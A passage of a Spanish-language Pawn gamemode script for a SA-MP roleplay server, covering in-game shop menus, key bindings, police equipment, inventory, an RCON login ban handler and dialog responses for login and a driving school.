				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(licoreria, playerid);
            }
            case 2: //Botella cerveza
            {
                new precio = 20, objeto = 61;
				if(GetPlayerMoney(playerid) < precio){SendClientMessage(playerid, Rojo, "* No tienes suficiente dinero."); return 1;}
				if(PlayerInfo[playerid][pManoDer] != 0 && PlayerInfo[playerid][pManoIzq] != 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
				if(PlayerInfo[playerid][pManoDer] == 0){PonerObjeto(playerid, 1, objeto); PlayerInfo[playerid][pManoDer] = objeto, PlayerInfo[playerid][pManoDerCant] = ObjetoInfo[objeto][Capacidad];}
				else if(PlayerInfo[playerid][pManoIzq] == 0){PonerObjeto(playerid, 2, objeto); PlayerInfo[playerid][pManoIzq] = objeto, PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[objeto][Capacidad];}
				format(string, sizeof(string), "Has comprado un/a %s por %d$.", ObjetoInfo[objeto][NombreObjeto], precio);
				SendClientMessage(playerid, Verde, string);
				GivePlayerMoneyAC(playerid, -precio);
                HideMenuForPlayer(licoreria, playerid);
            }
            case 3: //Salir
            {
				HideMenuForPlayer(licoreria, playerid);
            }
        }
    }
	return 1;
}

public OnPlayerExitedMenu(playerid)
{
    if(GetPlayerMenu(playerid) == restaurantes) TogglePlayerControllable(playerid, 1); //Restaurantes
	if(GetPlayerMenu(playerid) == bares) TogglePlayerControllable(playerid, 1); //Bares
	if(GetPlayerMenu(playerid) == comidasrapidas) TogglePlayerControllable(playerid, 1); //Comidas rápidas
	if(GetPlayerMenu(playerid) == discoteca) TogglePlayerControllable(playerid, 1); //Discotecas
	if(GetPlayerMenu(playerid) == puticlub) TogglePlayerControllable(playerid, 1); //Puticlubs
	if(GetPlayerMenu(playerid) == ammunation) TogglePlayerControllable(playerid, 1); //Ammu Nations
	if(GetPlayerMenu(playerid) == menu247) TogglePlayerControllable(playerid, 1); //24/7
	if(GetPlayerMenu(playerid) == tiendadeportes) TogglePlayerControllable(playerid, 1); //Tienda deportiva
	if(GetPlayerMenu(playerid) == ferreteria) TogglePlayerControllable(playerid, 1); //Ferretería
	if(GetPlayerMenu(playerid) == tiendaropa) TogglePlayerControllable(playerid, 1); //Tiendas de ropa
	if(GetPlayerMenu(playerid) == electronica) TogglePlayerControllable(playerid, 1); //Tienda electrónica
	
	if(GetPlayerMenu(playerid) == estanco) TogglePlayerControllable(playerid, 1); //Estanco
	if(GetPlayerMenu(playerid) == licoreria) TogglePlayerControllable(playerid, 1); //Licorería
	return 1;
}

public OnPlayerInteriorChange(playerid, newinteriorid, oldinteriorid)
{
	new x = 0; //Sistema RECON
	while(x!=MAX_PLAYERS)
	{
	    if( IsPlayerConnected(x) &&	GetPlayerState(x) == PLAYER_STATE_SPECTATING &&
		PlayerInfo[x][pSpecID] == playerid && PlayerInfo[x][pSpecType] == ADMIN_SPEC_TYPE_PLAYER)
		{
			SetPlayerVirtualWorld(x,GetPlayerVirtualWorld(playerid));
			SetPlayerInterior(x,newinteriorid);
		}
		x++;
	}
	return 1;
}

public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
    Anims_OnPlayerKeyStateChange(playerid, newkeys, oldkeys);
    if(EnCatalogoVeh[playerid] != NOEXISTE) //Concesionario catalogo
	{
		if(((newkeys & KEY_JUMP) == KEY_JUMP)  && ((oldkeys & KEY_JUMP) != KEY_JUMP)) //Shift
	    {
	        TextDrawHideForPlayer(playerid, Modelo[EnCatalogoVeh[playerid]]);
			TextDrawHideForPlayer(playerid, CocheNombre[EnCatalogoVeh[playerid]]);
			TextDrawHideForPlayer(playerid, Costo[EnCatalogoVeh[playerid]]);
			TextDrawHideForPlayer(playerid, Id[EnCatalogoVeh[playerid]]);
	        EnCatalogoVeh[playerid]--;
			catalogovehiculos(playerid, PConcesionario[playerid]);
			PlayerPlaySound(playerid, 1083, 0.0, 0.0, 0.0);
			return 1;
		}
	    if(((newkeys & KEY_WALK) == KEY_WALK) && ((oldkeys & KEY_WALK) != KEY_WALK)) //Alt
	    {
	        TextDrawHideForPlayer(playerid, Modelo[EnCatalogoVeh[playerid]]);
			TextDrawHideForPlayer(playerid, CocheNombre[EnCatalogoVeh[playerid]]);
			TextDrawHideForPlayer(playerid, Costo[EnCatalogoVeh[playerid]]);
			TextDrawHideForPlayer(playerid, Id[EnCatalogoVeh[playerid]]);
	        EnCatalogoVeh[playerid]++;
			catalogovehiculos(playerid, PConcesionario[playerid]);
			PlayerPlaySound(playerid, 1083, 0.0, 0.0, 0.0);
			return 1;
		}
	    if(((newkeys & KEY_SECONDARY_ATTACK) == KEY_SECONDARY_ATTACK) && ((oldkeys & KEY_SECONDARY_ATTACK) != KEY_SECONDARY_ATTACK)) //Intro
	    {
	        TextDrawHideForPlayer(playerid, Modelo[EnCatalogoVeh[playerid]]);
			TextDrawHideForPlayer(playerid, CocheNombre[EnCatalogoVeh[playerid]]);
			TextDrawHideForPlayer(playerid, Costo[EnCatalogoVeh[playerid]]);
			TextDrawHideForPlayer(playerid, Id[EnCatalogoVeh[playerid]]);
			TextDrawHideForPlayer(playerid,fila1);
			TextDrawHideForPlayer(playerid,fila2);
			TextDrawHideForPlayer(playerid,fila3);
			TextDrawHideForPlayer(playerid,fila4);
	        TogglePlayerControllable(playerid,1);
	    	EnCatalogoVeh[playerid] = NOEXISTE;
	    	SendClientMessage(playerid, Amarillo, "Esperamos que le haya gustado algún modelo.");
	    	PlayerPlaySound(playerid, 1084, 0.0, 0.0, 0.0);
			return 1;
		}
	}
    if(GetPlayerState(playerid) == PLAYER_STATE_SPECTATING && PlayerInfo[playerid][pSpecID] != INVALID_PLAYER_ID) //Sistema RECON
    {
		if(newkeys == KEY_JUMP) AdvanceSpectate(playerid);
		else if(newkeys == KEY_SPRINT) ReverseSpectate(playerid);
		else if(newkeys == 4) StartSpectate(playerid, PlayerInfo[playerid][pSpecID]);
		return 1;
	}
	if(newkeys & KEY_SECONDARY_ATTACK) //Al pulsar intro F
	{
        if(GetPlayerState(playerid) == 1)
		{
		    if(GetPlayerCajero(playerid))
		    {
		        MostrarATM(playerid, 1);
				return 1;
		    }
        	if(GetPlayerFueraPuertaCasa(playerid)) //Está en la entrada de una casa
			{
				new h = GetPlayerFueraPuertaCasa(playerid);
				if(HouseInfo[h][hCerrada] == 1){GameTextForPlayer(playerid, "~r~Cerrado", 5000, 1);}
				else
				{
				    TogglePlayerControllable(playerid, 0);
				    SetTimerEx("Descongelar", 2000, false, "i", playerid);
				    SetPlayerPos(playerid, HouseInfo[h][hSalidaX], HouseInfo[h][hSalidaY], HouseInfo[h][hSalidaZ]);
				    SetPlayerInterior(playerid, HouseInfo[h][hInterior]);
				    SetPlayerVirtualWorld(playerid, HouseInfo[h][hVirtualWorld]);
				    return 1;
				}
			}
			if(GetPlayerDentroPuertaCasa(playerid)) //Está en la salida de una casa
			{
			    new h = GetPlayerDentroPuertaCasa(playerid);
			    if(HouseInfo[h][hInterior2] != 0) //Si el mundo exterior no es 0 congelar y descongelar
			    {
			        TogglePlayerControllable(playerid, 0);
				    SetTimerEx("Descongelar", 2000, false, "i", playerid);
			    }
			    SetPlayerPos(playerid, HouseInfo[h][hEntradaX], HouseInfo[h][hEntradaY], HouseInfo[h][hEntradaZ]);
			    SetPlayerInterior(playerid, HouseInfo[h][hInterior2]);
			    SetPlayerVirtualWorld(playerid, HouseInfo[h][hVirtualWorld2]);
			    return 1;
			}
			if(GetPlayerFueraPuertaNego(playerid)) //Está en la entrada de un negocio
			{
				new n = GetPlayerFueraPuertaNego(playerid);
				if(NegoInfo[n][nCerrado] == 1){GameTextForPlayer(playerid, "~r~Cerrado", 5000, 1);}
				else
				{
				    TogglePlayerControllable(playerid, 0);
				    SetTimerEx("Descongelar", 2000, false, "i", playerid);
				    SetPlayerPos(playerid, NegoInfo[n][nSalidaX], NegoInfo[n][nSalidaY], NegoInfo[n][nSalidaZ]);
				    SetPlayerInterior(playerid, NegoInfo[n][nInterior]);
				    SetPlayerVirtualWorld(playerid, NegoInfo[n][nVirtualWorld]);
				    return 1;
				}
			}
			if(GetPlayerDentroPuertaNego(playerid)) //Está en la salida de un negocio
			{
			    new n = GetPlayerDentroPuertaNego(playerid);
			    if(NegoInfo[n][nInterior2] != 0) //Si el mundo exterior no es 0 congelar y descongelar
			    {
			        TogglePlayerControllable(playerid, 0);
				    SetTimerEx("Descongelar", 2000, false, "i", playerid);
			    }
			    SetPlayerPos(playerid, NegoInfo[n][nEntradaX], NegoInfo[n][nEntradaY], NegoInfo[n][nEntradaZ]);
			    SetPlayerInterior(playerid, NegoInfo[n][nInterior2]);
			    SetPlayerVirtualWorld(playerid, NegoInfo[n][nVirtualWorld2]);
			    return 1;
			}
			EntrarSitioPublico(playerid); //Entrar a establecimiento
		}
	}
	if((newkeys & KEY_CTRL_BACK) || (GetPlayerState(playerid) == PLAYER_STATE_DRIVER && (newkeys & KEY_CROUCH))) //Al pulsar H
	{
        AbrirPuerta(playerid); //Abrir puerta
        if(GetPlayerDentroNego(playerid)) //Está en un negocio
		{
		    if(!EstaEnMostrador(playerid)){return 1;} //No está en el mostrador
		    new n = GetPlayerDentroNego(playerid);
		    if(NegoInfo[n][nTipo] == 1) //Restaurantes
			{
			    ShowMenuForPlayer(restaurantes, playerid);
				TogglePlayerControllable(playerid, 0);
			}
		    if(NegoInfo[n][nTipo] == 2) //Bar
			{
			    ShowMenuForPlayer(bares, playerid);
				TogglePlayerControllable(playerid, 0);
			}
			if(NegoInfo[n][nTipo] == 3) //Comida rápida
			{
			    ShowMenuForPlayer(comidasrapidas, playerid);
				TogglePlayerControllable(playerid, 0);
			}
			if(NegoInfo[n][nTipo] == 4) //Discotecas
			{
			    ShowMenuForPlayer(discoteca, playerid);
				TogglePlayerControllable(playerid, 0);
			}
			if(NegoInfo[n][nTipo] == 5) //Puticlubs
			{
			    ShowMenuForPlayer(puticlub, playerid);
				TogglePlayerControllable(playerid, 0);
			}
			if(NegoInfo[n][nTipo] == 7) //Ammu Nations
			{
			    if(PlayerInfo[playerid][pServicioPD] > 0){return 1;}
			    if(PlayerInfo[playerid][pLicArmas] == 0){return 1;}
			    ShowMenuForPlayer(ammunation, playerid);
				TogglePlayerControllable(playerid, 0);
			}
			if(NegoInfo[n][nTipo] == 8) //24/7
			{
			    ShowMenuForPlayer(menu247, playerid);
				TogglePlayerControllable(playerid, 0);
			}
			if(NegoInfo[n][nTipo] == 9) //Tienda deportiva
			{
			    if(PlayerInfo[playerid][pServicioPD] > 0){return 1;}
			    ShowMenuForPlayer(tiendadeportes, playerid);
				TogglePlayerControllable(playerid, 0);
			}
			if(NegoInfo[n][nTipo] == 10) //Ferretería
			{
			    if(PlayerInfo[playerid][pServicioPD] > 0){return 1;}
			    ShowMenuForPlayer(ferreteria, playerid);
				TogglePlayerControllable(playerid, 0);
			}
			if(NegoInfo[n][nTipo] == 11) //Tiendas de ropa
			{
			    ShowMenuForPlayer(tiendaropa, playerid);
				TogglePlayerControllable(playerid, 0);
			}
			if(NegoInfo[n][nTipo] == 12) //Electrónica
			{
			    ShowMenuForPlayer(electronica, playerid);
				TogglePlayerControllable(playerid, 0);
			}
			if(NegoInfo[n][nTipo] == 18) //Estanco
			{
			    ShowMenuForPlayer(estanco, playerid);
				TogglePlayerControllable(playerid, 0);
			}
			if(NegoInfo[n][nTipo] == 19) //Licorería
			{
			    ShowMenuForPlayer(licoreria, playerid);
				TogglePlayerControllable(playerid, 0);
			}
		}
	}
	if(newkeys & KEY_YES) //Al pulsar Y
	{
        if(PlayerInfo[playerid][pServicioPD] == 0){MostrarInv(playerid);} //Abrir inventario
        if(PlayerInfo[playerid][pManoDer] == 38 && GetPlayerWeaponAmmo(playerid, 23) == 0 && PlayerInfo[playerid][pServicioPD] > 0)
		{
		    if(TaserRecarga[playerid] != 0){SendClientMessage(playerid, Rojo, "* Espera 5 segundos antes de recargar."); return 1;}
		    new string[70];
		    format(string, sizeof(string), "* %s recarga su pistola táser (400V).", GetPlayerNameRP(playerid));
			ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
			GivePlayerWeapon(playerid, 23, 1);
			ApplyAnimation(playerid,"SILENCED","Silence_reload",4.1,0,1,1,0,0);
		}
	}
	if(newkeys & KEY_NO) //Al pulsar N
	{
        if(PlayerInfo[playerid][pServicioPD] > 0 && PlayerInfo[playerid][pFaccion] == 1){MostrarCint(playerid);} //Abrir citurón (LSPD)
	}
	if(newkeys & KEY_FIRE) //Al pusar botón de ataque
	{
		if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	    {
		    if(PlayerInfo[playerid][pManoDer] == 17 && GetPlayerWeapon(playerid) == 17) //Sistema de granada de gas
			{
			    new string[128];
			    format(string, sizeof(string), "* %s lanza una granada de gas.", GetPlayerNameRP(playerid));
 	    		ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
 	    		PlayerInfo[playerid][pManoDer] = 0, ResetPlayerWeapons(playerid);
			    for(new i=0; i < MAX_PLAYERS; i++)
			    {
					if(GetPlayersProx(9, playerid, i) && MascaraGas[i] == 0 && GetPlayerState(i) == PLAYER_STATE_ONFOOT)
					{
					    SetPlayerDrunkLevel(i, 8000);
					    ApplyAnimation(i, "PED", "GAS_CWR",4.1,1,1,1,0,4000, 1);
					    ApplyAnimation(i, "PED", "GAS_CWR",4.1,1,1,1,0,4000, 1);
						SendClientMessage(i, NaranjaOscuro, "* Han lanzado una granada de gas cerca de tí, el humo te asfixía y no te deja ver.");
						FadePlayerScreen(i, 0xb0b0b0DA, 1);
					}
			    }
			}
			if(PlayerInfo[playerid][pManoDer] == 54 && GetPlayerWeapon(playerid) == 17) //Sistema de granada cegadora
			{
			    new string[128];
			    format(string, sizeof(string), "* %s lanza una granada cegadora.", GetPlayerNameRP(playerid));
 	    		ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
 	    		PlayerInfo[playerid][pManoDer] = 0, ResetPlayerWeapons(playerid);
			    for(new i=0; i < MAX_PLAYERS; i++)
			    {
					if(GetPlayersProx(10, playerid, i) && PlayerInfo[i][pServicioPD] == 0 && i != playerid)
					{
					    SetPlayerDrunkLevel(i, 6500);
						SendClientMessage(i, NaranjaOscuro, "* Han lanzado una granada cegadora cerca de tí, el fogonazo te ha dejado aturdido.");
						FadePlayerScreen(i, 0xFFFFFFFF, 1);
					}
			    }
			}
	    }
	}
	if((oldkeys == KEY_FIRE) && (newkeys == 0)) //Al pulsar y soltar botón de ataque
	{
		if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) //Encender motor de vehiculo
		{
			new car = GetPlayerVehicleID(playerid);
			if(IsABike(car)){return 1;}
			EncenderMotorF(playerid, car);
		}
		if(HaciendoPressBanca[playerid] == 1)
		{
		    RepeticionesPressBanca[playerid] ++;
		    ProgresoPressBanca[playerid] ++;
		    if(ProgresoPressBanca[playerid] >= 20)
		    {
				ApplyAnimation(playerid, "benchpress", "gym_bp_up_B", 1, 0, 0, 0, 1, 0, 1);
				ProgresoPressBanca[playerid] = 0;
		    }
		}
	}
	if(newkeys & KEY_ACTION) //Al pulsar LCTRL
	{
	    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER) //Encender luces de vehiculo
		{
		    new car = GetPlayerVehicleID(playerid);
			new engine,lights,alarm,doors,bonnet,boot,objective;
	        GetVehicleParamsEx(car,engine,lights,alarm,doors,bonnet,boot,objective);
	        if(lights == 0)SetVehicleParamsEx(car,engine,1,alarm,doors,bonnet,boot,objective);
	        else SetVehicleParamsEx(car,engine,0,alarm,doors,bonnet,boot,objective);
        }
	}
	if(newkeys & KEY_JUMP) //Al pulsar saltar
	{
        if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) //Anti BH
		{
		    SetTimerEx("AntiBHTimer",400,0,"d",playerid);
		    if(Esposado[playerid] > 0)
		    {
		        ApplyAnimation(playerid, "GYMNASIUM", "gym_jog_falloff",4.1,0,1,1,0,0);
		    }
		}
	}
    return 1;
}

public OnRconLoginAttempt(ip[], password[], success)
{
	if(!success)
	{
	    new string[128];
		for(new x=0; x<MAX_PLAYERS; x++)
		{
		    GetPlayerIp(x, string, sizeof(string));
            if(!strcmp(ip, string, true))
            {
                format(string, sizeof(string), "'%s' ha sido kickeado por fallar al intentar loguear como admin RCON.", GetPlayerNameRP(x));
                SendAdminMessage(Aguamarina, string);
                SendClientMessage(x, Rojo, "Has sido kickeado automáticamente por intentar loguear como admin RCON.");
                KickL(x);
                return 1;
            }
		}
	    format(string, sizeof(string), "banip %s", ip);
        SendRconCommand(string);
	}
	return 1;
}

public OnPlayerUpdate(playerid)
{
    if(PrimerSpawn[playerid] != 1 || PrimerSpawn[playerid] != 1 || JugadorLogueado[playerid] != 1){return 0;}
	//Inventario
	if(PlayerInfo[playerid][pManoDer] > 0)
	{
		if(GetPlayerWeapon(playerid) != ObjetoInfo[PlayerInfo[playerid][pManoDer]][IDArma] && GetPlayerWeaponAmmo(playerid, ObjetoInfo[PlayerInfo[playerid][pManoDer]][IDArma]) > 0)
		{
			SetPlayerArmedWeapon(playerid, ObjetoInfo[PlayerInfo[playerid][pManoDer]][IDArma]);
		}
		else if(GetPlayerWeaponAmmo(playerid, ObjetoInfo[PlayerInfo[playerid][pManoDer]][IDArma]) == 0) //Si no le queda munición
		{
			if(GetPlayerWeapon(playerid) != 0)SetPlayerArmedWeapon(playerid, 0);
		}
	}
	//Arreglo de las gafas de visión nocturna / térmica
	if(GetPlayerWeapon(playerid) == 44 || GetPlayerWeapon(playerid) == 45)
    {
        new keys, ud, lr;
        GetPlayerKeys(playerid, keys, ud, lr);
        if((keys & KEY_FIRE) && (!IsPlayerInAnyVehicle(playerid)))
        {
            return 0;
        }
    }
    //Pinchos LPSD
    if(GetPlayerState(playerid) == 2)
	{
		for(new i = 0; i < sizeof(ObjectsInfo); i++)
  	    {
  	        if(IsPlayerInRangeOfPoint(playerid, 3.0, ObjectsInfo[i][cpX], ObjectsInfo[i][cpY], ObjectsInfo[i][cpZ]) && ObjectsInfo[i][cpType] == 1)
            {
  	            if(ObjectsInfo[i][cpCreated] == 1)
  	            {
  	                new panels, doors, lights, tires;
  	                new carid = GetPlayerVehicleID(playerid);
		            GetVehicleDamageStatus(carid, panels, doors, lights, tires);
		            tires = encode_tires(1, 1, 1, 1);
		            UpdateVehicleDamageStatus(carid, panels, doors, lights, tires);
  	                return 0;
  	            }
  	        }
  	    }
  	    //Velocímetro
  	    new Float:x,Float:y,Float:z,string[24],vehicleid = GetPlayerVehicleID(playerid);
		GetVehicleVelocity(vehicleid,x,y,z);
		velocidad[playerid] = floatround(floatsqroot(((x*x)+(y*y))+(z*z))*175);
		format(string,sizeof(string),"Vel.: %dKm/h",velocidad[playerid]);
		TextDrawSetString(vvel[playerid],string);
		format(string,sizeof(string),"Gas: %dL",CarInfo[vehicleid][cGas]);
		TextDrawSetString(fuel[playerid],string);
	}
    return 1;
}

public OnPlayerStreamIn(playerid, forplayerid)
{
	if(PlayerNameOff[playerid] == 1) //Nameoff
	{
		ShowPlayerNameTagForPlayer(playerid, forplayerid, 0);
	}
	if(PlayerNameOff[playerid] == 0) //Nameon
	{
		ShowPlayerNameTagForPlayer(playerid, forplayerid, 1);
	}
	return 1;
}

public OnPlayerStreamOut(playerid, forplayerid)
{
return 1;
}

public OnVehicleStreamIn(vehicleid, forplayerid)
{
return 1;
}

public OnVehicleStreamOut(vehicleid, forplayerid)
{
return 1;
}

public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
    Anims_OnDialogResponse(playerid, dialogid, response, listitem);
    if(dialogid == 0) //Logueo
  	{
        if(response == 0) //Si da a Salir
        {
	        Kick(playerid);
        }
        if(response == 1) //Si da a Entrar
        {
            if(strlen(inputtext))
            {
                new tmppass[64];
                strmid(tmppass, inputtext, 0, strlen(inputtext), 255);
                OnPlayerLogin(playerid,tmppass);
            }
	        else
	        {
                IntentosLogueo[playerid] += 1;
                if(IntentosLogueo[playerid] == 4){SendClientMessage(playerid, Amarillo, "Tu IP ha sido baneada por introducir mal la contraseña repetidamente."); SendClientMessage(playerid, Amarillo, "Si crees que ha sido un error, saca foto con F8 y pide tu desbán en www.foro.com"); BanL(playerid); return 1;}
                new loginstring[128];
                format(loginstring,sizeof(loginstring),"Contraseña incorrecta, inténtalo de nuevo. \nRecuerda que serás baneado si la escribes mal 4 veces.");
                ShowPlayerDialog(playerid,0,DIALOG_STYLE_PASSWORD,"Nexus RP",loginstring,"Entrar","Salir");
            }
        }
        return 1;
    }
    if(dialogid == 1) //Ascensor LSPD
    {
		if(!response){TogglePlayerControllable(playerid, 1); return 1;}
		if(listitem == 0)
		{
			SetPlayerPos(playerid,255.0220,126.2807,1003.2188);
			SetPlayerInterior(playerid, 10);
			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerFacingAngle(playerid, 180);
			TogglePlayerControllable(playerid, 1);
		}
		if(listitem == 1)
		{
            SetPlayerPos(playerid,1568.6243,-1689.9784,6.2188);
            SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerFacingAngle(playerid, 180);
			TogglePlayerControllable(playerid, 1);
		}
		if(listitem == 2)
		{
		    SetPlayerPos(playerid,-1594.2114,716.2331,-4.9063);
		    SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, 0);
			SetPlayerFacingAngle(playerid, 270);
			TogglePlayerControllable(playerid, 1);
		}
	}
	if(dialogid == 2) //Inventario
    {
        if(!response){return 1;}
		new i = listitem;
		if(i == 8){return 1;} //Selecciona la barra separadora
		if(i >= 0 && i <= 7) //Selecciona un bolsillo
		{
			SacarBolsillo(playerid, i);
		}
		if(i == 9) //Selecciona mano derecha
		{
			GuardarBolsillo(playerid, 1);
		}
		if(i == 10) //Selecciona mano izquierda
		{
		    GuardarBolsillo(playerid, 2);
		}
		if(i == 11) //Selecciona intercambio de manos
		{
		    CambiarObjetosMano(playerid);
		}
    }
    if(dialogid == 3) //Vestuario LSPD
    {
    	if(!response){return 1;}
    	new string[128];
    	switch(listitem)
    	{
    		case 0: //Cadete
    		{
				SetPlayerSkin(playerid, 71);
				format(string, sizeof(string), "* %s coge el uniforme de cadete y se viste.", GetPlayerNameRP(playerid));
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
				PlayerInfo[playerid][pServicioPD] = 1;
				return 1;
    		}
    		case 1: //Motero
    		{
				SetPlayerSkin(playerid, 284);
				format(string, sizeof(string), "* %s coge el uniforme de motero y se viste.", GetPlayerNameRP(playerid));
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
				PlayerInfo[playerid][pServicioPD] = 2;
				return 1;
    		}
    		case 2: //Oficial 1
    		{
				SetPlayerSkin(playerid, 280);
				format(string, sizeof(string), "* %s coge el uniforme de oficial y se viste.", GetPlayerNameRP(playerid));
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
				PlayerInfo[playerid][pServicioPD] = 3;
				return 1;
    		}
    		case 3: //Oficial 2
    		{
				SetPlayerSkin(playerid, 281);
				format(string, sizeof(string), "* %s coge el uniforme de oficial y se viste.", GetPlayerNameRP(playerid));
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
				PlayerInfo[playerid][pServicioPD] = 4;
				return 1;
    		}
    		case 4: //Oficial 3
    		{
				SetPlayerSkin(playerid, 267);
				format(string, sizeof(string), "* %s coge el uniforme de oficial y se viste.", GetPlayerNameRP(playerid));
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
				PlayerInfo[playerid][pServicioPD] = 5;
				return 1;
    		}
    		case 5: //Oficial 4
    		{
				SetPlayerSkin(playerid, 266);
				format(string, sizeof(string), "* %s coge el uniforme de oficial y se viste.", GetPlayerNameRP(playerid));
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
				PlayerInfo[playerid][pServicioPD] = 6;
				return 1;
    		}
    		case 6: //Oficial 5
    		{
    			SetPlayerSkin(playerid, 265);
				format(string, sizeof(string), "* %s coge el uniforme de oficial y se viste.", GetPlayerNameRP(playerid));
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
				PlayerInfo[playerid][pServicioPD] = 7;
				return 1;
    		}
    		case 7: //Paisano
    		{
    			if(PlayerInfo[playerid][pRango] < 5){SendClientMessage(playerid, Rojo, "* Rango insuficiente."); return 1;}
    			SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
				SendClientMessage(playerid, Amarillo, "Contacta con un admin superior si quieres hacer un rol de paisano más desarrollado.");
				format(string, sizeof(string), "* %s se pone de servicio como paisano.", GetPlayerNameRP(playerid));
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
				PlayerInfo[playerid][pServicioPD] = 8;
				return 1;
    		}
    		case 8: //SWAT
    		{
    			SetPlayerSkin(playerid, 285);
				format(string, sizeof(string), "* %s coge el traje de SWAT y se viste.", GetPlayerNameRP(playerid));
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
				PlayerInfo[playerid][pServicioPD] = 9;
				return 1;
    		}
    		case 9: //Superior
    		{
    			SetPlayerSkin(playerid, 283);
				format(string, sizeof(string), "* %s coge el uniforme de superior y se viste.", GetPlayerNameRP(playerid));
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
				PlayerInfo[playerid][pServicioPD] = 10;
				return 1;
    		}
    		case 10: //Comisario
    		{
    			SetPlayerSkin(playerid, 288);
				format(string, sizeof(string), "* %s coge el uniforme de comisario y se viste.", GetPlayerNameRP(playerid));
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
				PlayerInfo[playerid][pServicioPD] = 11;
				return 1;
    		}
    		case 11: //Skin de mujer
    		{
    			if(PlayerInfo[playerid][pSexo] != 2){SendClientMessage(playerid, Rojo, "* No eres mujer."); return 1;}
    			SetPlayerSkin(playerid, 211);
				format(string, sizeof(string), "* %s coge su uniforme y se viste.", GetPlayerNameRP(playerid));
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
				PlayerInfo[playerid][pServicioPD] = 12;
				return 1;
    		}
    		case 12: //Ropa normal
    		{
    			if(PlayerInfo[playerid][pManoDer] > 0 || PlayerInfo[playerid][pManoIzq] > 0 || PlayerInfo[playerid][pEspalda] > 0){SendClientMessage(playerid, Rojo, "* Devuelve antes tus armas."); return 1;}
    			if(!(GetPlayerSkin(playerid) == 288 || GetPlayerSkin(playerid) == 285 || GetPlayerSkin(playerid) == 284 || GetPlayerSkin(playerid) == 280 || GetPlayerSkin(playerid) == 71 || GetPlayerSkin(playerid) == 282 || PlayerInfo[playerid][pServicioPD] > 0)){SendClientMessage(playerid, Rojo, "* No estás de servicio."); return 1;}
    			for(new x = 0; x < 8; x++)
				{
	  				PlayerInfo[playerid][pCint][x] = 0;
	  				PlayerInfo[playerid][pCintCant][x] = 0;
				}
				SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
				format(string, sizeof(string), "* %s coge su ropa y se viste.", GetPlayerNameRP(playerid));
				ProxDetector(15.0, playerid, string, Morado,Morado,Morado,Morado,Morado);
				PlayerInfo[playerid][pServicioPD] = 0;
				for(new i = 0; i < MAX_PLAYERS; i++)
				{
					if(IsPlayerConnected(i))
					{
						if(PlayerInfo[i][pFaccion] == 1 && SolicitaRefuerzos[i] == 1)
						{
							SetPlayerMarkerForPlayer(playerid, i, Blanco2);
						}
					}
				}
				return 1;
    		}
    	}
    }
    if(dialogid == 4) //Armería LSPD
    {
		return 1;
    }
    if(dialogid == 5) //Cinturón LSPD
  	{
  	    if(!response){return 1;}
  	    new i = listitem;
		if(i >= 0 && i <= 7) //Selecciona un bolsillo
		{
			SacarCint(playerid, i);
		}
		if(i == 8){return 1;} //Selecciona la barra separadora
		if(i == 9) //Selecciona mano derecha
		{
			GuardarCint(playerid, 1);
		}
		if(i == 10) //Selecciona mano izquierda
		{
		    GuardarCint(playerid, 2);
		}
		if(i == 11) //Selecciona intercambio de manos
		{
		    CambiarObjetosMano(playerid);
		}
  	}
  	if(dialogid == 6) //Maleteros
  	{
  	    if(!response){return 1;}
  	    new i = listitem;
		if(i == 7){return 1;} //Selecciona la barra separadora
		if(i >= 0 && i <= 6) //Selecciona un bolsillo
		{
			SacarMaletero(playerid, VehMaleteroPlayer[playerid], i);
		}
		if(i == 8) //Selecciona mano derecha
		{
			GuardarMaletero(playerid, VehMaleteroPlayer[playerid], 1);
		}
		if(i == 9) //Selecciona mano izquierda
		{
		    GuardarMaletero(playerid, VehMaleteroPlayer[playerid], 2);
		}
  	}
  	if(dialogid == 7) //Autoescuela conducción intro
  	{
  	    if(!response){EnAutoEscuela[playerid] = 0; TogglePlayerControllable(playerid, 1); return 1;}
  	    TemaAutoescuelaCond(playerid, 1);
  	}
  	if(dialogid == 8) //Autoescuela conducción tema 1
  	{
  	    if(!response){TemaAutoescuelaCond(playerid, 0); return 1;}
  	    TemaAutoescuelaCond(playerid, 2);
  	}
  	if(dialogid == 9) //Autoescuela conducción tema 2
  	{
  	    if(!response){TemaAutoescuelaCond(playerid, 1); return 1;}
  	    TemaAutoescuelaCond(playerid, 3);
  	}
  	if(dialogid == 10) //Autoescuela conducción tema 3
  	{
